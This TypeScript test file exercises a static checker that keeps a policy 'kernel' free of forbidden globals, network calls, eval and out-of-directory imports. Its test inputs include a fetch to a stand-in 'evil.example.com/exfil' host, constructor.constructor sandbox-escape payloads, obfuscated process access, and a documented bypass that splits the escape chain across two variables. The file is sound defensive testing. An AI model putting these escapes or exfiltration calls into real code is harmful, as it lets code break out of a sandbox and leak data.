import { test } from "node:test";
import assert from "node:assert/strict";
import {
  checkKernelPurity,
  classifyImport,
  extractImportSpecifiers,
  scanFileContent,
  scanForbiddenGlobals,
  scanForbiddenGlobalsAst,
  stripComments,
} from "./kernel-purity-check.ts";

const repoRoot = process.cwd();

// --- stripComments -----------------------------------------------------------

test("stripComments: removes // line comments", () => {
  assert.equal(stripComments('const x = 1; // process.env is fine to mention here'), "const x = 1; ");
});

test("stripComments: removes block comments, including multi-line ones", () => {
  const source = "/* no filesystem, network, or process access */\nconst x = 1;";
  assert.equal(stripComments(source), "\nconst x = 1;");
});

// --- scanForbiddenGlobals -----------------------------------------------------

test("scanForbiddenGlobals: catches each forbidden global/pattern individually", () => {
  const cases: [string, string][] = [
    ["process", "return process.cwd();"],
    ["fetch(", 'await fetch("https://example.com");'],
    ["setTimeout(", "setTimeout(fn, 100);"],
    ["setInterval(", "setInterval(fn, 100);"],
    ["require(", 'const x = require("fs");'],
    ["dynamic import(", 'const x = await import("./y.ts");'],
    ["__dirname", "console.log(__dirname);"],
    ["__filename", "console.log(__filename);"],
  ];
  for (const [name, snippet] of cases) {
    const found = scanForbiddenGlobals(snippet);
    assert.ok(found.some((f) => f.name === name), `expected "${name}" to be flagged in: ${snippet}`);
  }
});

test("scanForbiddenGlobals: does NOT flag pure code with none of the forbidden patterns", () => {
  assert.deepEqual(scanForbiddenGlobals("export function add(a: number, b: number) { return a + b; }"), []);
});

test("scanForbiddenGlobals (Issue #63 fix-now): catches each widened bare-identifier/constructor pattern individually", () => {
  const cases: [string, string][] = [
    ["globalThis", "return globalThis;"],
    ["global", 'return global["proc" + "ess"];'],
    ["Reflect", 'return Reflect.get(o, "x");'],
    ["eval", 'return eval("1 + 1");'],
    ["Function(", 'const f = new Function("return 1");'],
    ["Function(", 'const f = Function("return 1");'],
  ];
  for (const [name, snippet] of cases) {
    const found = scanForbiddenGlobals(snippet);
    assert.ok(found.some((f) => f.name === name), `expected "${name}" to be flagged in: ${snippet}`);
  }
});

test("scanForbiddenGlobals (Issue #63 addendum, S2 re-confirm): bare `global` — distinct from `globalThis` — is caught, closing the gap app-security-reviewer demonstrated (`global[\"proc\"+\"ess\"]` had zero detections before this fix)", () => {
  const found = scanForbiddenGlobals('return global["proc" + "ess"];');
  assert.ok(found.some((f) => f.name === "global"));
});

test("scanForbiddenGlobals (Issue #63 addendum, false-positive check): `global` is word-bounded — does NOT fire merely because `globalThis` or another word containing \"global\" as a substring appears", () => {
  assert.deepEqual(scanForbiddenGlobals("return globalization;").filter((f) => f.name === "global"), []);
  const globalThisFound = scanForbiddenGlobals("return globalThis;");
  assert.deepEqual(
    globalThisFound.filter((f) => f.name === "global"),
    [],
    "the bare-`global` pattern must not double-match inside `globalThis`",
  );
  assert.ok(globalThisFound.some((f) => f.name === "globalThis"), "globalThis itself must still be flagged under its own pattern");
});

test("scanForbiddenGlobals: a bare \"Function\" type annotation (not a call) is NOT flagged", () => {
  assert.deepEqual(scanForbiddenGlobals("export function wrap(cb: Function): void { cb(); }"), []);
});

test("scanForbiddenGlobals (Issue #63 regression): string-concatenation obfuscation of \"process\" is caught via the literal Reflect/globalThis identifiers, even though the reassembled string never appears", () => {
  const source = 'Reflect.get(globalThis, "proc" + "ess");';
  // The old process-only regex is exactly what this obfuscation defeats — confirm that directly.
  assert.deepEqual(scanForbiddenGlobals(source).filter((f) => f.name === "process"), []);
  const found = scanForbiddenGlobals(source);
  assert.ok(found.some((f) => f.name === "globalThis"));
  assert.ok(found.some((f) => f.name === "Reflect"));
});

test("scanForbiddenGlobals (false-positive regression): the word \"process\" inside a comment is NOT flagged", () => {
  const source = "// no filesystem, network, or process access\nexport function pure() { return 1; }";
  assert.deepEqual(scanForbiddenGlobals(source), []);
});

test("scanForbiddenGlobals: a real import statement for a module is not itself a dynamic-import() violation", () => {
  const source = 'import { readFile } from "node:fs/promises";';
  assert.deepEqual(scanForbiddenGlobals(source), []);
});

// --- scanForbiddenGlobalsAst (Issue #63 AST hardening) --------------------------------

test("scanForbiddenGlobalsAst: catches a bare (non-aliased) usage of each of the nine tracked roots via property access", () => {
  const cases: [string, string][] = [
    ["globalThis", "return globalThis.eval;"],
    ["global", "return global.process;"],
    ["Reflect", 'return Reflect.get(o, "x");'],
    ["eval", "return eval.name;"],
    ["Function", "return Function.name;"],
    ["fetch", "return fetch.name;"],
    ["setTimeout", "return setTimeout.name;"],
    ["setInterval", "return setInterval.name;"],
    ["require", "return require.resolve;"],
  ];
  for (const [name, snippet] of cases) {
    const found = scanForbiddenGlobalsAst(snippet);
    assert.ok(found.some((f) => f.name === name), `expected AST layer to flag "${name}" in: ${snippet}`);
  }
});

test("scanForbiddenGlobalsAst: an alias assigned via a variable declaration is resolved when used through property access", () => {
  const found = scanForbiddenGlobalsAst("const g = globalThis;\ng.eval;");
  assert.ok(found.some((f) => f.name === "globalThis" && /property access "\.eval"/.test(f.detail)));
});

test("scanForbiddenGlobalsAst: an alias assigned via plain reassignment (not a declaration) is also resolved", () => {
  const found = scanForbiddenGlobalsAst("let g;\ng = global;\ng.process;");
  assert.ok(found.some((f) => f.name === "global" && /property access "\.process"/.test(f.detail)));
});

test("scanForbiddenGlobalsAst: an alias chain resolves transitively (b aliases a, a aliases globalThis)", () => {
  const found = scanForbiddenGlobalsAst("const a = globalThis;\nconst b = a;\nb.eval;");
  assert.ok(found.some((f) => f.name === "globalThis" && /property access "\.eval"/.test(f.detail)));
});

test("scanForbiddenGlobalsAst: a computed/bracket element access on an alias constant-folds a string-literal-only `+` chain into the detail", () => {
  const found = scanForbiddenGlobalsAst('const g = globalThis;\ng["ev" + "al"];');
  assert.ok(found.some((f) => f.name === "globalThis" && f.detail.includes('["eval"]')));
});

test("scanForbiddenGlobalsAst: a computed/bracket element access is still flagged (without a resolved key) when the key does not constant-fold, since the base object is what's forbidden", () => {
  const found = scanForbiddenGlobalsAst('const g = globalThis;\nconst key = String(Math.random());\ng[key];');
  assert.ok(found.some((f) => f.name === "globalThis" && f.detail.includes("[...]")));
});

test("scanForbiddenGlobalsAst: sees through `as`/`satisfies`/non-null/legacy-angle-bracket casts to resolve the underlying identifier (this codebase's own idiom for indexing globalThis/global under strict TS)", () => {
  const asChain = scanForbiddenGlobalsAst('(globalThis as unknown as Record<string, unknown>)["eval"];');
  assert.ok(asChain.some((f) => f.name === "globalThis"), "as-cast chain must still resolve");

  const nonNull = scanForbiddenGlobalsAst("(globalThis!).eval;");
  assert.ok(nonNull.some((f) => f.name === "globalThis"), "non-null assertion must still resolve");
});

test("scanForbiddenGlobalsAst: a destructure bound directly off a forbidden root is flagged immediately, independent of how the bound name is later used", () => {
  const found = scanForbiddenGlobalsAst("const { get } = Reflect;\nvoid get;");
  assert.ok(found.some((f) => f.name === "Reflect" && /destructured "get"/.test(f.detail)));
});

test("scanForbiddenGlobalsAst (false-positive guard): a destructure off a global NOT in the tracked forbidden-roots set (Math) is not flagged", () => {
  const found = scanForbiddenGlobalsAst("const { round } = Math;\nvoid round;");
  assert.deepEqual(found, []);
});

test("scanForbiddenGlobalsAst (false-positive guard): a local variable name that merely resembles a forbidden root, or is aliased to a non-forbidden value, is not flagged", () => {
  const found = scanForbiddenGlobalsAst(
    ["const globalConfig = { flag: true };", "globalConfig.flag;", "const notAGlobal = {};", "const alias = notAGlobal;", "alias.foo;"].join(
      "\n",
    ),
  );
  assert.deepEqual(found, []);
});

test("scanForbiddenGlobalsAst (false-positive guard): ordinary bracket/element access on a plain array or object literal is not flagged", () => {
  const found = scanForbiddenGlobalsAst('const arr = [1, 2, 3];\nconst obj = { a: 1 };\narr[0];\nobj["a"];');
  assert.deepEqual(found, []);
});

// --- scanForbiddenGlobalsAst (Issue #211 fix-now): direct call through a bare root or a tracked alias ---

test("scanForbiddenGlobalsAst (Issue #211 fix-now): a direct call through a BARE forbidden root, with no property/element access on the callee, is flagged", () => {
  const cases: [string, string][] = [
    ["fetch", 'fetch("https://example.com");'],
    ["setTimeout", "setTimeout(() => {}, 1000);"],
    ["setInterval", "setInterval(() => {}, 1000);"],
    ["require", 'require("node:child_process");'],
    ["eval", 'eval("1+1");'],
  ];
  for (const [name, snippet] of cases) {
    const found = scanForbiddenGlobalsAst(snippet);
    assert.ok(
      found.some((f) => f.name === name && /^direct call through forbidden global/.test(f.detail)),
      `expected AST layer to flag a direct call to "${name}" in: ${snippet}`,
    );
  }
});

test("scanForbiddenGlobalsAst (Issue #211 fix-now, the exact bug both reviewers demonstrated): a direct call reached through a TRACKED ALIAS, with no property/element access on the alias itself, is now flagged for fetch/setTimeout/setInterval/require — the dominant real invocation shape for these four roots, and exactly the gap that nullified the Q1 ruling's own stated purpose before this fix", () => {
  const cases: [string, string][] = [
    ["fetch", 'const f = fetch;\nf("https://evil.example.com/exfil");'],
    ["setTimeout", "const t = setTimeout;\nt(() => {}, 1000);"],
    ["setInterval", "const i = setInterval;\ni(() => {}, 1000);"],
    ["require", 'const r = require;\nr("node:child_process");'],
  ];
  for (const [name, snippet] of cases) {
    const found = scanForbiddenGlobalsAst(snippet);
    assert.ok(
      found.some((f) => f.name === name && /^direct call through forbidden global "[^"]+" \(possibly via alias\)/.test(f.detail)),
      `expected AST layer to flag alias-then-call to "${name}" in: ${snippet}`,
    );
  }
});

test("scanForbiddenGlobalsAst: a call through a PROPERTY ACCESS callee (e.g. `fetch.bind(null)()`) is not double-counted by the new call branch — resolveExpressionRoot only resolves bare identifiers, so the call branch itself contributes nothing extra there; the property-access branch alone still catches it", () => {
  const found = scanForbiddenGlobalsAst("fetch.bind(null)();");
  const propertyFindings = found.filter((f) => /property access/.test(f.detail));
  const callFindings = found.filter((f) => /^direct call/.test(f.detail));
  assert.ok(propertyFindings.some((f) => f.name === "fetch"), "property access on fetch.bind must still be caught");
  assert.deepEqual(callFindings, [], "the call branch must not also fire on a non-identifier callee");
});

// --- scanForbiddenGlobalsAst (Issue #210 fix-now): .constructor.constructor prototype-pivot escape ---

test("scanForbiddenGlobalsAst (Issue #210 fix-now): the classic `.constructor.constructor(...)` prototype-pivot sandbox escape is flagged, even though no tracked root identifier appears anywhere in the source", () => {
  const cases = [
    '({}).constructor.constructor("return this")();',
    'const obj = {};\nobj.constructor.constructor("return this")();',
  ];
  for (const source of cases) {
    const found = scanForbiddenGlobalsAst(source);
    assert.ok(
      found.some((f) => f.name === "constructor-pivot" && /\.constructor\.constructor\(\.\.\.\)/.test(f.detail)),
      `expected the constructor-pivot check to flag: ${source}`,
    );
  }
});

test("scanForbiddenGlobalsAst (Issue #210 fix-now, false-positive guard): a single-level `.constructor` property access or call is NOT flagged — only the double chain immediately called is", () => {
  assert.deepEqual(scanForbiddenGlobalsAst("x.constructor.name;"), []);
  assert.deepEqual(scanForbiddenGlobalsAst("x.constructor();"), []);
});

test("scanForbiddenGlobalsAst (Issue #210 re-confirm fix-now, app-security-reviewer 2026-09-17): the bracket-notation and mixed dot/bracket variants of the prototype-pivot chain are flagged too — the undisclosed, easier bypass of the original dot-only check, requiring no variable-splitting or aliasing at all", () => {
  const cases = [
    '({})["constructor"]["constructor"]("return this")();',
    '({})["constructor"].constructor("return this")();',
    '({}).constructor["constructor"]("return this")();',
  ];
  for (const source of cases) {
    const found = scanForbiddenGlobalsAst(source);
    assert.ok(
      found.some((f) => f.name === "constructor-pivot"),
      `expected the constructor-pivot check to flag: ${source}`,
    );
  }
});

test("scanForbiddenGlobalsAst (Issue #210 re-confirm fix-now, false-positive guard): a single-level `.constructor` access via BRACKET notation is NOT flagged, same as the dot-notation guard above", () => {
  assert.deepEqual(scanForbiddenGlobalsAst('x["constructor"].name;'), []);
  assert.deepEqual(scanForbiddenGlobalsAst('x["constructor"]();'), []);
});

test("scanForbiddenGlobalsAst (Issue #210, disclosed residual, documented not guessed past): splitting the `.constructor.constructor` chain across two variable declarations bypasses the narrow adjacent-token check — the check is root-independent but not alias-of-`.constructor`-aware", () => {
  const found = scanForbiddenGlobalsAst(
    ["const step1 = ({}).constructor;", "const step2 = step1.constructor;", 'step2("return this")();'].join("\n"),
  );
  assert.deepEqual(found, [], "documents the check's own disclosed scope boundary, not a defect");
});

test("scanForbiddenGlobalsAst: pure code with none of the tracked roots produces zero findings", () => {
  assert.deepEqual(scanForbiddenGlobalsAst("export function add(a: number, b: number) { return a + b; }"), []);
});

// --- extractImportSpecifiers ---------------------------------------------------

test("extractImportSpecifiers: extracts named, type, and bare (side-effect) imports", () => {
  const source = [
    'import { x } from "./a.ts";',
    'import type { Y } from "./b.ts";',
    'import "./c.ts";',
    'import z from "node:path";',
  ].join("\n");
  const specifiers = extractImportSpecifiers(source);
  assert.deepEqual(specifiers.sort(), ["./a.ts", "./b.ts", "./c.ts", "node:path"].sort());
});

test("extractImportSpecifiers: ignores an import specifier mentioned only in a comment", () => {
  const source = '// import { x } from "node:fs";\nexport const y = 1;';
  assert.deepEqual(extractImportSpecifiers(source), []);
});

// --- classifyImport -------------------------------------------------------------

test("classifyImport: a bare/non-relative specifier is a non-relative-import violation", () => {
  const v = classifyImport("node:fs", "src/policy/kernel/kernel.ts", "src/policy/kernel");
  assert.equal(v?.kind, "non-relative-import");
});

test("classifyImport: a relative import resolving inside kernelRoot is NOT a violation", () => {
  const v = classifyImport("./verdict.ts", "src/policy/kernel/kernel.ts", "src/policy/kernel");
  assert.equal(v, null);
});

test("classifyImport: a relative import resolving outside kernelRoot is an out-of-directory-import violation", () => {
  const v = classifyImport("../fixtures/rules.ts", "src/policy/kernel/kernel.ts", "src/policy/kernel");
  assert.equal(v?.kind, "out-of-directory-import");
  assert.match(v?.detail ?? "", /src\/policy\/fixtures\/rules\.ts/);
});

// --- scanFileContent -------------------------------------------------------------

test("scanFileContent: combines import and forbidden-global violations for one file", () => {
  const source = ['import { readFile } from "node:fs";', "export function f() { return process.cwd(); }"].join("\n");
  const violations = scanFileContent("src/policy/kernel/kernel.ts", source, "src/policy/kernel");
  assert.equal(violations.length, 2);
  assert.ok(violations.some((v) => v.kind === "non-relative-import"));
  assert.ok(violations.some((v) => v.kind === "forbidden-global"));
});

test("scanFileContent: a clean file produces zero violations", () => {
  const source = 'import { x } from "./sibling.ts";\nexport const y = x;';
  assert.deepEqual(scanFileContent("src/policy/kernel/kernel.ts", source, "src/policy/kernel"), []);
});

// --- checkKernelPurity (integration, real fixture files on disk) -----------------

test("checkKernelPurity: the CLEAN self-test fixture passes", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/clean");
  assert.equal(result.ok, true, result.details.join("\n"));
  assert.equal(result.vacuous, false);
});

test("checkKernelPurity: the VIOLATING self-test fixture fails, naming all three violation classes", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(result.ok, false);
  const details = result.details.join("\n");
  assert.match(details, /non-relative-import/);
  assert.match(details, /out-of-directory-import/);
  assert.match(details, /forbidden-global/);
});

test("checkKernelPurity (Issue #63 fix-now, non-vacuous): the widened check catches the string-concatenation-obfuscated globalThis/Reflect fixture in the VIOLATING self-test directory", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(result.ok, false);
  const details = result.details.join("\n");
  assert.match(details, /obfuscated-globals\.ts/);
  assert.match(details, /globalThis/);
  assert.match(details, /Reflect/);
});

test("checkKernelPurity (Issue #63 addendum, S2 re-confirm, non-vacuous): the bare-`global` variant in the same VIOLATING self-test fixture (`global[\"proc\"+\"ess\"]`) is now caught", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(result.ok, false);
  const details = result.details.join("\n");
  assert.match(details, /obfuscated-globals\.ts/);
  assert.match(details, /forbidden global\/pattern "global" found/);
});

test("scanFileContent: the regex and AST forbidden-global layers both feed the same violation kind and run independently (AST-only violation is caught even though the regex layer also fires on the same literal token)", () => {
  const source = "const g = globalThis;\ng.eval;";
  const violations = scanFileContent("src/policy/kernel/kernel.ts", source, "src/policy/kernel");
  assert.ok(violations.every((v) => v.kind === "forbidden-global"));
  assert.ok(violations.some((v) => /\(AST: property access "\.eval"/.test(v.detail)), "AST layer's finding must appear");
  assert.ok(
    violations.some((v) => v.detail === 'forbidden global/pattern "globalThis" found'),
    "regex layer's own finding must still appear unchanged, additively",
  );
});

test("checkKernelPurity (Issue #63 AST hardening, non-vacuous): an aliased globalThis/global reached via property/element access is caught in the VIOLATING self-test fixture", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(result.ok, false);
  const details = result.details.join("\n");
  assert.match(details, /aliased-globalthis\.ts.*\(AST: computed element access \["eval"\] on forbidden global "globalThis"/);
  assert.match(details, /aliased-globalthis\.ts.*\(AST: property access "\.process" on forbidden global "global"/);
});

test("checkKernelPurity (Issue #63 AST hardening, non-vacuous): a destructure bound directly off Reflect is caught in the VIOLATING self-test fixture", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(result.ok, false);
  const details = result.details.join("\n");
  assert.match(details, /destructured-reflect\.ts.*\(AST: destructured "get" directly off forbidden global "Reflect"\)/);
});

test("checkKernelPurity (Issue #63 AST hardening, non-vacuous): a string-concatenation-obfuscated computed bracket access on globalThis is caught in the VIOLATING self-test fixture", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(result.ok, false);
  const details = result.details.join("\n");
  assert.match(details, /computed-bracket-access\.ts.*\(AST: computed element access \["eval"\] on forbidden global "globalThis"/);
});

test("checkKernelPurity (Issue #63 Q1 Manager ruling, non-vacuous): aliased fetch/setTimeout/setInterval/require reached via property access are all caught in the VIOLATING self-test fixture", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(result.ok, false);
  const details = result.details.join("\n");
  assert.match(details, /aliased-network-timer\.ts.*"fetch" found \(AST: property access "\.bind"/);
  assert.match(details, /aliased-network-timer\.ts.*"setTimeout" found \(AST: property access "\.name"/);
  assert.match(details, /aliased-network-timer\.ts.*"setInterval" found \(AST: property access "\.name"/);
  assert.match(details, /aliased-network-timer\.ts.*"require" found \(AST: property access "\.resolve"/);
});

test("checkKernelPurity (Issue #211 fix-now, non-vacuous): a direct call through an alias to fetch/setTimeout/setInterval/require, with no property access on the alias, is now caught in the VIOLATING self-test fixture", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(result.ok, false);
  const details = result.details.join("\n");
  assert.match(details, /aliased-network-timer\.ts.*"fetch" found \(AST: direct call through forbidden global "fetch"/);
  assert.match(details, /aliased-network-timer\.ts.*"setTimeout" found \(AST: direct call through forbidden global "setTimeout"/);
  assert.match(details, /aliased-network-timer\.ts.*"setInterval" found \(AST: direct call through forbidden global "setInterval"/);
  assert.match(details, /aliased-network-timer\.ts.*"require" found \(AST: direct call through forbidden global "require"/);
});

test("checkKernelPurity (Issue #210 fix-now, non-vacuous): the .constructor.constructor prototype-pivot escape is caught in the VIOLATING self-test fixture, and the false-positive guard fixture stays clean", async () => {
  const violating = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(violating.ok, false);
  const details = violating.details.join("\n");
  assert.match(details, /constructor-pivot\.ts.*"constructor-pivot" found/);

  const clean = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/clean");
  assert.equal(clean.ok, true, clean.details.join("\n"));
});

test("checkKernelPurity (Issue #210 re-confirm fix-now, non-vacuous): the bracket-notation and mixed dot/bracket prototype-pivot variants are caught in the VIOLATING self-test fixture, and the extended bracket-notation false-positive guards stay clean", async () => {
  const violating = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(violating.ok, false);
  const violatingCount = violating.details.filter(
    (d) => d.includes("constructor-pivot.ts") && d.includes('"constructor-pivot" found'),
  ).length;
  assert.equal(violatingCount, 4, violating.details.join("\n"));

  const clean = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/clean");
  assert.equal(clean.ok, true, clean.details.join("\n"));
});

test("checkKernelPurity (Issue #63 AC5 regression): a renamed non-relative import is caught by the existing classifyImport check, independent of the AST forbidden-globals layer", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
  assert.equal(result.ok, false);
  const details = result.details.join("\n");
  assert.match(details, /renamed-import\.ts: \[non-relative-import\] import "node:child_process"/);
});

test("checkKernelPurity: an empty/nonexistent root -> vacuous pass, disclosed loudly", async () => {
  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/does-not-exist");
  assert.equal(result.ok, true);
  assert.equal(result.vacuous, true);
});

test("checkKernelPurity: the REAL src/policy/kernel production code is itself pure (proof, not just self-test fixtures)", async () => {
  const result = await checkKernelPurity(repoRoot, "src/policy/kernel");
  assert.equal(result.ok, true, result.details.join("\n"));
  assert.equal(result.vacuous, false, "src/policy/kernel must contain real production files by S2, not be empty");
});
